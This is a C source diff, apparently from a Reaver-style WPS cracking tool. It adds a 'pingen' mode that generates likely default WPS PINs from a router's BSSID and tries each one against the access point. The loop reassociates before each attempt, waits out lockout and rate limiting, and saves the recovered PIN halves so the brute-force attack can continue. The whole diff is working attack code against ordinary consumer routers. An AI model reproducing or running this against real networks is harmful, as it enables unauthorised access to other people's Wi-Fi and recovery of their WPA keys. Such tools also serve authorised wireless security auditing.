@@ -39,6 +39,7 @@ void crack()
 {
 	char *bssid = NULL;
 	char *pin = NULL;
+	int pingen_ok = 0;
 	int fail_count = 0, loop_count = 0, sleep_count = 0, assoc_fail_count = 0;
 	float pin_count = 0;
 	time_t start_time = 0;
@@ -104,6 +105,19 @@ void crack()
                 }
 		#endif
 
+		/* Check key status to run pingen_crack() or not */
+		if(get_key_status() == KEY_DONE) {
+			if(get_pingen()) {
+				cprintf(INFO, "[+] Session restored say that pin was cracked, skipping --pingen\n");
+				set_pingen(0);
+			}
+		}
+		/* Run default pins attack */
+		else if (get_pingen()) {
+			pingen_ok = pingen_crack();
+			set_pingen(0);
+		}
+
 		/* Used to calculate pin attempt rates */
 		start_time = time(NULL);
 
@@ -116,7 +130,7 @@ void crack()
 		 * If we're starting a session at KEY_DONE, that means we've already cracked the pin and the AP is being re-attacked.
 		 * Re-set the status to KEY2_WIP so that we properly enter the main cracking loop.
 		 */
-		else if(get_key_status() == KEY_DONE)
+		else if(get_key_status() == KEY_DONE && !pingen_ok)
 		{
 			set_key_status(KEY2_WIP);
 		}
@@ -271,6 +285,253 @@ void crack()
 	{
 		cprintf(CRITICAL, "[-] Failed to initialize interface '%s'\n", get_iface());
 	}
+}
+
+/* Use some default pins to attack */
+int pingen_crack()
+{
+	char *bssid = NULL;
+	char *pin = NULL;
+	int *mac_pins = NULL;
+	int pingen_len, i, ret_val;
+	int fail_count = 0, loop_count = 0, sleep_count = 0, assoc_fail_count = 0;
+	char str_pin[12];
+	char answer = 0;
+	char p1[5] = { 0 };
+	char p2[4] = { 0 };
+	float pin_count = 0;
+	enum wps_result result = 0;
+	enum key_state tmp_status;
+
+	/* Convert BSSID to a string */
+	bssid = mac2str(get_bssid(), ':');
+	ret_val = pingen_len = 0;
+	/* Get the defaults pins with BSSID and WPS Device Data of AP */
+	mac_pins = build_pingen(&pingen_len);
+	if(mac_pins && pingen_len > 0)
+	{
+		/* Don't use cprintf here; else, if the output is sent to a file via -o, the user won't see this prompt. */
+		fprintf(stderr, "\n[?] Do you want to use the pins above? [n/Y] ");
+		setbuf(stdin, NULL);
+		answer = getc(stdin);
+		if(answer != 'y' && answer != 'Y' && answer != '\n')
+		{
+			/* Stop attack with generated pins */
+			return 0;
+		}
+		/* store key status before pingen_crack() */
+		tmp_status = get_key_status();
+		set_key_status(KEY1_WIP);
+		/* Default Pins cracking loop */
+		for(i=loop_count=sleep_count=0; get_key_status() != KEY_DONE && i < pingen_len; loop_count++, sleep_count++)
+		{
+			/* 
+			 * Some APs may do brute force detection, or might not be able to handle an onslaught of WPS
+			 * registrar requests. Using a delay here can help prevent the AP from locking us out.
+			 */
+			pcap_sleep(get_delay());
+
+			/* Users may specify a delay after x number of attempts */
+			if((get_recurring_delay() > 0) && (sleep_count == get_recurring_delay_count()))
+			{
+				cprintf(VERBOSE, "[+] Entering recurring delay of %d seconds\n", get_recurring_delay());
+				pcap_sleep(get_recurring_delay());
+				sleep_count = 0;
+			}
+
+			/* 
+			 * Some APs identify brute force attempts and lock themselves for a short period of time (typically 5 minutes).
+			 * Verify that the AP is not locked before attempting the next pin.
+			 */
+			while(get_ignore_locks() == 0 && is_wps_locked())
+			{
+				cprintf(WARNING, "[!] WARNING: Detected AP rate limiting, waiting %d seconds before re-checking\n", get_lock_delay());
+				pcap_sleep(get_lock_delay());
+			}
+
+			/* Initialize wps structure */
+			set_wps(initialize_wps_data());
+			if(!get_wps())
+			{
+				cprintf(CRITICAL, "[-] Failed to initialize critical data structure\n");
+				break;
+			}
+
+			/* Try the next pin in the list */
+			if(mac_pins[i] < 0)
+			{
+				str_pin[0] = '\0';
+			}
+			else
+			{
+				sprintf(str_pin, "%07d%d", mac_pins[i], wps_pin_checksum(mac_pins[i]));
+			}
+			set_pin(str_pin);
+			pin = build_next_pin();
+			if(!pin)
+			{
+				cprintf(CRITICAL, "[-] Failed to generate the next payload\n");
+				break;
+			}
+			else
+			{
+				cprintf(WARNING, "[+] Trying DEFAULT PIN \"%s\"%s\n", pin, (strlen(pin)>0)?"":" (<empty>)");
+			}
+
+			/* 
+			 * Reassociate with the AP before each WPS exchange. This is necessary as some APs will
+			 * severely limit our pin attempt rate if we do not.
+			 */
+			assoc_fail_count = 0;
+			while(!reassociate())
+			{
+				if(assoc_fail_count == MAX_ASSOC_FAILURES)
+				{
+					assoc_fail_count = 0;
+					cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
+				}
+				else
+				{
+					assoc_fail_count++;
+				}
+			}
+			cprintf(INFO, "[+] Associated with %s (ESSID: %s)\n", bssid, get_ssid());
+
+			/* 
+			 * Enter receive loop. This will block until a receive timeout occurs or a
+			 * WPS transaction has completed or failed.
+			 */
+			result = do_wps_exchange();
+
+			switch(result)
+			{
+				/* 
+				 * If the last pin attempt was rejected, increment 
+				 * the pin counter, clear the fail counter and move 
+				 * on to the next pin.
+				 */
+				case KEY_REJECTED:
+					fail_count = 0;
+					pin_count++;
+					if(get_key_status() == KEY2_WIP && strlen(p1) == 0)
+					{
+						strncpy(p1, pin, 4);
+						p1[4] = '\0';
+						strncpy(p2, pin+4, 3);
+						p2[3] = '\0';
+					}
+					++i;
+					break;
+				/* Got it!! */
+				case KEY_ACCEPTED:
+					ret_val = 1;
+					break;
+				/* Unexpected timeout or EAP failure...try this pin again */
+				default:
+					cprintf(VERBOSE, "[!] WPS transaction failed (code: 0x%.2X), re-trying last pin\n", result);
+					fail_count++;
+					break;
+			}
+
+			/* If we've had an excessive number of message failures in a row, print a warning */
+			if(fail_count == WARN_FAILURE_COUNT)
+			{
+				cprintf(WARNING, "[!] WARNING: %d failed connections in a row\n", fail_count);
+				fail_count = 0;
+				pcap_sleep(get_fail_delay());
+			}
+
+			/* 
+			 * The WPA key and other settings are stored in the globule->wps structure. If we've 
+			 * recovered the WPS pin and parsed these settings, don't free this structure. It 
+			 * will be freed by wpscrack_free() at the end of main().
+			 */
+			if(get_key_status() != KEY_DONE)
+			{
+				wps_deinit(get_wps());
+				set_wps(NULL);
+			}
+			free(pin);
+			pin = NULL;
+
+			/* If we've hit our max number of pin attempts, quit */
+			/*
+			if((get_max_pin_attempts() > 0) && 
+			   (pin_count >= get_max_pin_attempts()))
+			{
+				cprintf(VERBOSE, "[+] Quitting after %d crack attempts\n", get_max_pin_attempts());
+				break;
+			}
+			*/
+		}
+		/* Check key status */
+		if (get_key_status() == KEY1_WIP){
+			/* Add used pins to P1 keys */
+			insert_pingen_p1(mac_pins, pingen_len);
+			set_pin(NULL);
+		}
+		else if (get_key_status() == KEY2_WIP){
+			/* Cancel string mode because string mode has not been KEY2_WIP */
+			if (get_pin_string_mode()) {
+				set_pin_string_mode(0);
+				set_static_p1(NULL);
+			}
+			/* Check former state */
+			if (tmp_status == KEY1_WIP) {
+				set_static_p1(p1);
+				/* set_static_p2(NULL); */
+				generate_pins();
+				set_p1_index(0);
+				set_p2_index(0);
+			}
+			else {
+				/* not match p1, may be router's pin changed, then reset all */
+				if (strcmp(get_p1(get_p1_index()), p1) != 0) {
+					set_static_p1(p1);
+					set_static_p2(NULL);
+					generate_pins();
+					set_p1_index(0);
+					set_p2_index(0);
+					if (tmp_status == KEY_DONE) {
+						tmp_status = KEY2_WIP;
+					}
+				}
+			}
+			/* Add used pin to P2 keys */
+			i = atoi(p2);
+			insert_pingen_p2(&i, 1);
+			set_pin(NULL);
+			cprintf(INFO, "[+] Found first half pin '%s'\n", p1);
+		}
+		else {
+			/* Cancel string mode because string mode has not been KEY_DONE */
+			if (get_pin_string_mode()) {
+				set_pin_string_mode(0);
+				set_static_p1(NULL);
+			}
+			/* check empty pin */
+			if (get_pin() && strlen(get_pin())>0) {
+				memcpy(p1, get_pin(), 4);
+				p1[4] = '\0';
+				memcpy(p2, get_pin()+4, 3);
+				p2[3] = '\0';
+				set_static_p1(p1);
+				set_static_p2(p2);
+				generate_pins();
+				set_p1_index(0);
+				set_p2_index(0);
+			}
+			cprintf(INFO, "[+] Found pin '%s'\n", get_pin());
+		}
+		/* restore key status if < former state */
+		if (get_key_status() < tmp_status) {
+			set_key_status(tmp_status);
+		}
+	}
+	if(bssid) free(bssid);
+	if(mac_pins) free(mac_pins);
+
+	return ret_val;
 }
 
 /* 
